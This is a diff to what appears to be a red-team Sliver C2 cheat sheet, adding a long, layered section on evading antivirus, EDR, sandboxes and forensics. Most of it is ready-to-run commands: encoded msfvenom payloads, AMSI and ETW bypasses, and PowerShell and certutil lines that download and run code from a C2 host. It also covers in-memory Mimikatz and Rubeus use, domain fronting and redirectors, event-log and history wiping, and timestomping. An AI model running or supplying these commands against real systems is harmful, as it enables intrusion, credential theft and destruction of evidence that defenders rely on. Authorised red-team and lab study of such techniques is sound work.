@@ -1755,20 +1755,462 @@ named-pipe --name sliver_pipe
 > [!danger] Lab Only
 > The techniques below are for authorized red team engagements and lab practice. Misuse is illegal.
 
-### Implant OPSEC
+---
 
-| Concern | Mitigation |
-|---------|------------|
-| **Default implant names** | Use `--name` with blend-in names like `update` or `svchost` |
-| **Command-line artifacts** | Use `--skip-symbols` to strip debug symbols |
-| **Binary signatures** | Regenerate implants between ops; unique compile signatures |
-| **Memory artifacts** | Use `--evasion` flag; test against target EDR |
-| **Disk artifacts** | Use `rm` to clean up; avoid writing to disk when possible |
-| **Network patterns** | Vary beacon intervals with `--jitter`; use DNS or WG for stealth |
-| **Shellcode entropy** | Use `--shellcode-entropy 3` for max obfuscation (name randomize + encrypt) |
-| **Shellcode detection** | Use `--shellcode-compress` (aPLib) + `--shellcode-bypass 2` (abort on fail) |
-| **Build detection** | Monitor with `watchtower` → `monitor start` for VT/X-Force alerting |
-| **Staging exposure** | Use `--aes-encrypt-key` for encrypted stage delivery |
+### Evasion & Bypass Techniques 🛡️
+
+This section covers practical evasion using **Sliver C2**, **Metasploit**, and **Kali Linux** tooling. Defense has improved significantly — static AV bypass alone is insufficient. Modern evasion requires a layered approach.
+
+#### Layer 1: Static Analysis Bypass (AV)
+
+**Goal:** Get the implant past signature-based and heuristic detection.
+
+| Technique | Sliver | Metasploit | Kali Tools |
+|-----------|--------|------------|------------|
+| Symbol stripping | `--skip-symbols` | N/A | `strip --strip-all binary` |
+| Binary obfuscation | `--evasion` | `msfvenom --encoder` | `obfuscator-llvm`, `UPX` |
+| Shellcode compression | `--shellcode-compress` | `msfvenom -e x86/shikata_ga_nai` | `shellnoob` |
+| Entropy randomization | `--shellcode-entropy 3` | `msfvenom -i 5` (iterations) | `peCloak`, `peCloakCapa` |
+| Custom compile | Regenerate per target | N/A | Custom source build |
+
+**Sliver Evasion Flags:**
+
+```sliver
+# Full evasion build
+sliver > generate --name evasive --http 10.10.10.10 --format exe \
+  --skip-symbols \
+  --evasion \
+  --shellcode-entropy 3
+
+# Shellcode with compression and bypass
+sliver > generate --name shell-evade --http 10.10.10.10 --format shellcode \
+  --shellcode-compress \
+  --shellcode-entropy 3 \
+  --shellcode-bypass 2 \
+  --shellcode-exitopt 1
+```
+
+**Metasploit Encoding (Kali):**
+
+```bash
+# Shikata Ga Nai encoder (most common, still effective against basic AV)
+$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 \
+  -e x64/xor_dynamic -i 5 -f exe -o payload.exe
+
+# Multiple encoders (chain encoding)
+$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 \
+  -e x64/xor_dynamic -i 3 \
+  -e x64/shikata_ga_nai -i 3 \
+  -f exe -o encoded_payload.exe
+
+# List available encoders
+$ msfvenom --list encoders
+
+# Best encoders for x64:
+# - x64/xor_dynamic (good evasion, low entropy increase)
+# - x64/shikata_ga_nai (classic, well-known, may flag some AV)
+# - x64/zutto_dekiru (polymorphic)
+```
+
+**Kali Binary Obfuscation Tools:**
+
+```bash
+# 1. UPX packing (compresses executable, may bypass some signatures)
+$ upx --best --ultra-brute payload.exe -o packed.exe
+# Warning: UPX signatures are well-known, may trigger AV
+
+# 2. Shellcode encoding with shellnoob
+$ shellnoob -i shellcode.bin -e x86/shikata_ga_nai -c 3 -o encoded_shellcode.bin
+
+# 3. PE manipulation with peCloak (Python tool)
+$ git clone https://github.com/v-p-b/peCloak.py && cd peCloak.py
+$ python pecloak.py -i payload.exe -o cloaked.exe --add-section .null --fill-random
+
+# 4. Hyperion (AES encrypter)
+$ hyperion payload.exe encrypted_payload.exe
+
+# 5. Binary patching with x64dbg/ghidra (manual)
+# - Modify PE header fields
+# - Add junk sections
+# - Change compile timestamps
+# - Modify rich header
+```
+
+---
+
+#### Layer 2: Behavioral Bypass (EDR/Behavior Monitoring)
+
+**Goal:** Avoid triggering heuristics, sandbox, and behavioral detection.
+
+| Technique | Sliver | Metasploit | Kali Tools |
+|-----------|--------|------------|------------|
+| Process migration | `migrate <pid>` | `migrate <pid>` | N/A |
+| Living-off-the-land | LOTL commands via `shell` | LOLBAS via `execute` | LOLBAS, GTFOBins |
+| Memory-only execution | Shellcode injection | `migrate` + `execute` | `donut`, `sRDI` |
+| AMSI bypass | Armory extension | `amsi_bypass` module | `amsi.fail` |
+| ETW patching | Armory extension | `patch_etw` module | Custom BOF |
+| Process hollowing | Armory/BOF | Custom module | `process_hollowing` tools |
+
+**Sliver Behavioral Techniques:**
+
+```sliver
+# 1. Migrate to a legitimate process (avoid spawning suspicious processes)
+sliver (IMPLANT) > ps
+sliver (IMPLANT) > migrate 1234  # PID of explorer.exe, svchost.exe, etc.
+
+# 2. Use living-off-the-land binaries (LOLBAS)
+sliver (IMPLANT) > shell certutil -urlcache -split -f http://10.10.10.10/payload.exe C:\Users\Public\legit.exe
+sliver (IMPLANT) > shell powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"
+sliver (IMPLANT) > shell wmic process call create "C:\Windows\System32\calc.exe"
+
+# 3. Memory-only execution via execute-assembly (Sliver)
+sliver (IMPLANT) > execute-assembly /tools/Rubeus.exe kerberoast
+# Runs .NET assembly in-memory, no disk write
+
+# 4. Sideloading DLLs (no process spawn)
+sliver (IMPLANT) > sideload /tools/mimikatz.dll
+
+# 5. Install and use Armory evasion extensions
+sliver > armory install amsi-bypass
+sliver (IMPLANT) > execute-extension amsi-bypass
+
+sliver > armory install etw-patch
+sliver (IMPLANT) > execute-extension etw-patch
+```
+
+**Metasploit Evasion Modules (Kali):**
+
+```bash
+$ msfconsole -q
+
+# AMSI bypass (Anti-Malware Scan Interface)
+msf6 > use post/windows/manage/amsi_bypass
+msf6 (amsi_bypass) > set SESSION 1
+msf6 (amsi_bypass) > run
+
+# ETW patching (Event Tracing for Windows)
+msf6 > use post/windows/manage/patch_etw
+msf6 (patch_etw) > set SESSION 1
+msf6 (patch_etw) > run
+
+# PowerShell downgrade (avoids ScriptBlock logging)
+msf6 > use post/windows/manage/powershell_downgrade
+msf6 (powershell_downgrade) > set SESSION 1
+msf6 (powershell_downgrade) > run
+
+# Migrate to stable process
+msf6 > run post/windows/manage/migrate
+
+# Load Mimikatz without writing to disk
+meterpreter > load kiwi
+meterpreter > creds_all
+```
+
+**Kali Evasion Utilities:**
+
+```bash
+# 1. Donut — Convert .NET PE to shellcode for in-memory execution
+$ donut -i Rubeus.exe -o rubeus.bin
+# Then inject with Sliver's execute-assembly or custom injector
+
+# 2. sRDI — Shellcode Reflective DLL Injection
+$ python sRDI.py Mimikatz.dll -f go -o mimikatz_shellcode.bin
+
+# 3. Invoke-Obfuscation (PowerShell obfuscation)
+$ pwsh
+PS> Import-Module ./Invoke-Obfuscation.psd1
+PS> Invoke-Obfuscation
+# Interactive menu to obfuscate any PowerShell script
+
+# 4. Amsi.fail — Generate AMSI bypass one-liners
+# https://amsi.fail/ or local:
+$ git clone https://github.com/Flangvik/AMSI.fail
+
+# 5. SharpHide — Hide registry run keys
+$ SharpHide.exe action=add keyvalue="C:\Users\Public\implant.exe"
+
+# 6. Timestomp — Modify file timestamps (forensics evasion)
+$ timestomp payload.exe -m "2026-01-15 08:30:00" -a "2026-01-15 08:30:00"
+```
+
+---
+
+#### Layer 3: Network Traffic Evasion
+
+**Goal:** Blend C2 traffic, avoid network signatures, evade DPI.
+
+| Technique | Sliver | Metasploit | Kali Tools |
+|-----------|--------|------------|------------|
+| Domain fronting | `--host-header` param | `set HttpHostHeader` | CDN setup |
+| DNS C2 | `--dns` listener | DNS payloads | `dnscat2` |
+| WireGuard tunnel | `--wg` listener | N/A | `wg-quick` |
+| Malleable profiles | Custom C2 params | `.rc` scripts | Custom profile |
+| Jitter/beacon variance | `--jitter` | `set SessionExpirationTimeout` | N/A |
+| Redirectors | Nginx/SOCAT | N/A | `socat`, `redsocks` |
+
+**Sliver Network Evasion:**
+
+```sliver
+# 1. Domain fronting (hide true C2 IP behind CDN)
+sliver > generate --https cdn.cloudflare.com?host-header=legit-site.com --format exe
+
+# 2. DNS C2 for restrictive firewalls
+sliver > dns --domains c2.example.com --lhost 0.0.0.0
+sliver > generate --dns c2.example.com --beacon 300 --jitter 50 --format exe
+
+# 3. WireGuard for encrypted tunnel (looks like VPN)
+sliver > wg --lhost 0.0.0.0 --lport 53
+sliver > generate --wg 10.10.10.10:53 --format exe
+
+# 4. Slow beacon with high jitter (low-and-slow)
+sliver > generate --http 10.10.10.10 --beacon 600 --jitter 40 --format exe
+# Calls back every 360-840 seconds (10-14 min range)
+
+# 5. Multiple C2 protocols (fallback)
+sliver > generate --http 10.10.10.10 --dns c2.example.com --wg 10.10.10.10 --format exe
+```
+
+**Metasploit Network Evasion (Kali):**
+
+```bash
+# 1. Domain fronting with Meterpreter
+msf6 > use exploit/multi/handler
+msf6 (handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
+msf6 (handler) > set LHOST cdn.example.com
+msf6 (handler) > set HttpHostHeader legitimate-site.com
+msf6 (handler) > run
+
+# 2. DNS-based payload delivery
+msf6 > use auxiliary/server/dns
+msf6 (dns) > run
+
+# 3. Session communication timeout (reduce traffic)
+msf6 (handler) > set SessionCommunicationTimeout 600
+msf6 (handler) > set SessionExpirationTimeout 604800  # 7 days
+
+# 4. SSL certificate (custom, not self-signed)
+msf6 (handler) > set StagerVerifySSLCert true
+```
+
+**Kali Redirector Setup:**
+
+```bash
+# SOCAT redirector (simple port forward, hide true C2)
+$ socat TCP4-LISTEN:443,fork TCP4:10.10.10.10:443
+
+# HTTPS redirector with Nginx
+# /etc/nginx/sites-available/c2-redirect:
+server {
+    listen 443 ssl;
+    server_name c2.example.com;
+    
+    ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;
+    
+    location / {
+        proxy_pass http://10.10.10.10:80;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+}
+
+# DNS redirector (redirect DNS queries to Sliver DNS)
+$ iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 10.10.10.10:53
+```
+
+---
+
+#### Layer 4: Sandbox & Analysis Evasion
+
+**Goal:** Detect and evade automated analysis environments.
+
+| Technique | Sliver | Metasploit | Kali Tools |
+|-----------|--------|------------|------------|
+| Environment checks | Custom scripts | `post/multi/gather/env` | `checkvm`, `al-khaser` |
+| Sleep/timing evasion | `--beacon` delays | `sleep` command | N/A |
+| User interaction wait | BOF/extension | `getuid` checks | Custom code |
+| VM artifact detection | Armory extension | Custom module | `VMDetector` |
+
+**Sliver Sandbox Evasion:**
+
+```sliver
+# 1. Check for VM artifacts before executing (via shell)
+sliver (IMPLANT) > shell wmic bios get serialnumber
+sliver (IMPLANT) > shell wmic baseboard get product
+# Compare against known VM identifiers (VMware, VirtualBox, QEMU)
+
+# 2. Armory extension for VM detection
+sliver > armory search vm
+sliver > armory install vm-detect
+sliver (IMPLANT) > execute-extension vm-detect
+
+# 3. Use beacon mode (delays execution, may timeout sandbox)
+sliver > generate --http 10.10.10.10 --beacon 120 --format exe
+```
+
+**Metasploit Sandbox Checks (Kali):**
+
+```bash
+# Check for VM/sandbox indicators
+msf6 > use post/multi/gather/checkvm
+msf6 (checkvm) > set SESSION 1
+msf6 (checkvm) > run
+
+# Environment enumeration
+msf6 > use post/multi/gather/env
+msf6 (env) > set SESSION 1
+msf6 (env) > run
+
+# Manual sandbox checks via Meterpreter
+meterpreter > sysinfo
+meterpreter > run post/windows/gather/enum_virtualization
+```
+
+**Kali VM Detection Tools:**
+
+```bash
+# 1. al-khaser (comprehensive VM detection)
+$ git clone https://github.com/LordNoteworthy/al-khaser && cd al-khaser
+$ make && ./al-khaser
+
+# 2. Check VM artifacts manually
+$ dmidecode -t system | grep -i manufacturer
+$ lscpu | grep -i hypervisor
+
+# 3. pafish (Paranoid Fish) — VM/sandbox detection test
+$ git clone https://github.com/a0rtega/pafish && cd pafish
+$ make && ./pafish.exe
+```
+
+---
+
+#### Layer 5: Post-Exploitation OPSEC
+
+**Goal:** Minimize artifacts and evidence after compromise.
+
+| Technique | Sliver | Metasploit | Kali Tools |
+|-----------|--------|------------|------------|
+| Memory-only tools | `execute-assembly` | `mimikatz` in mem | `donut` |
+| Log clearing | `shell wevtutil` | `clearev` | `wevtutil`, `auditpol` |
+| File cleanup | `rm` command | `rm` module | `srm`, `shred` |
+| Timestamp manipulation | `shell timestomp` | `timestomp` | `touch` |
+| Process hiding | BOF/extension | `migrate` | Rootkits |
+
+**Sliver Cleanup:**
+
+```sliver
+# 1. Clear Windows event logs
+sliver (IMPLANT) > shell wevtutil cl Security
+sliver (IMPLANT) > shell wevtutil cl System
+sliver (IMPLANT) > shell wevtutil cl Application
+
+# 2. Timestomp files (modify timestamps to blend in)
+sliver (IMPLANT) > shell powershell -c "(Get-Item 'C:\Users\Public\implant.exe').LastWriteTime = '2026-01-15 08:30:00'"
+
+# 3. Remove all tools and implants
+sliver (IMPLANT) > rm C:\Users\Public\implant.exe
+sliver (IMPLANT) > rm C:\Windows\Temp\*
+
+# 4. Terminate cleanly (no crash artifacts)
+sliver (IMPLANT) > die
+```
+
+**Metasploit Cleanup (Kali):**
+
+```bash
+# Clear event logs
+meterpreter > clearev
+
+# Timestomp file
+meterpreter > timestomp C:\Users\Public\implant.exe -z "01/15/2026 08:30:00"
+
+# Remove files
+meterpreter > rm C:\Users\Public\implant.exe
+
+# Kill traces from registry (persistence removal)
+msf6 > use post/windows/manage/delete_registry
+msf6 (delete_registry) > set KEY "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyBackdoor"
+msf6 (delete_registry) > run
+```
+
+**Kali Forensics Countermeasures:**
+
+```bash
+# 1. Secure file deletion
+$ srm -z payload.exe  # Overwrite with zeros, then delete
+$ shred -vfz -n 5 payload.exe  # 5 passes of random data + zeros
+
+# 2. Clear bash history
+$ history -c && history -w
+$ echo "" > ~/.bash_history
+
+# 3. Clear system logs (on compromised Linux host)
+$ echo "" > /var/log/auth.log
+$ echo "" > /var/log/syslog
+$ journalctl --vacuum-time=1s
+
+# 4. Modify file timestamps
+$ touch -d "2026-01-15 08:30:00" payload.exe
+$ touch -r /bin/ls payload.exe  # Copy timestamps from legitimate file
+```
+
+---
+
+### Evasion Workflow Summary
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                    LAYERED EVASION WORKFLOW                      │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐          │
+│  │   BUILD     │ →  │   DELIVER   │ →  │   EXECUTE   │          │
+│  │             │    │             │    │             │          │
+│  │ Sliver:     │    │ Redirector  │    │ AMSI bypass │          │
+│  │ --evasion   │    │ Domain      │    │ ETW patch   │          │
+│  │ --skip-     │    │  fronting   │    │ Migrate     │          │
+│  │   symbols   │    │ DNS/WG C2   │    │ LOTL        │          │
+│  │             │    │             │    │             │          │
+│  │ MSF:        │    │             │    │ Memory-only │          │
+│  │ msfvenom    │    │             │    │ tools       │          │
+│  │ encoders    │    │             │    │             │          │
+│  │             │    │             │    │             │          │
+│  │ Kali:       │    │             │    │             │          │
+│  │ UPX, obfus- │    │             │    │             │          │
+│  │ cator-llvm  │    │             │    │             │          │
+│  └─────────────┘    └─────────────┘    └─────────────┘          │
+│         │                  │                  │                  │
+│         ▼                  ▼                  ▼                  │
+│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐          │
+│  │   DETECT    │    │   SANDBOX   │    │   CLEANUP   │          │
+│  │             │    │             │    │             │          │
+│  │ VT check    │    │ VM detect   │    │ Log clear   │          │
+│  │ Watchtower  │    │ Sleep/      │    │ File wipe   │          │
+│  │             │    │   beacon    │    │ Timestomp   │          │
+│  │ Test vs     │    │ Environment │    │ Registry    │          │
+│  │ target AV   │    │  checks     │    │ cleanup     │          │
+│  └─────────────┘    └─────────────┘    └─────────────┘          │
+│                                                                  │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+### Implant OPSEC Summary Table
+
+| Concern | Sliver | Metasploit | Kali Tools |
+|---------|--------|------------|------------|
+| **Default implant names** | Use `--name` with blend-in names | Use `-n` custom name | N/A |
+| **Command-line artifacts** | `--skip-symbols` | N/A | `strip` |
+| **Binary signatures** | Regenerate per target | Different payload each time | Custom build |
+| **Memory artifacts** | `--evasion`, test vs EDR | `migrate`, `metsrv` mods | BOF, donut |
+| **Disk artifacts** | `rm`, memory-only execution | `rm`, in-memory | `srm`, `shred` |
+| **Network patterns** | `--jitter`, DNS/WG | `SessionTimeout`, DNS | Redirectors |
+| **Shellcode detection** | `--shellcode-compress`, `--shellcode-entropy 3` | `msfvenom -e -i 5` | peCloak, UPX |
+| **Build detection** | Watchtower VT/X-Force | Manual VT check | `vt-cli` |
+| **Staging exposure** | `--aes-encrypt-key` | Staged payload | Encrypted staging |
+
+---
 
 ### Infrastructure OPSEC
 
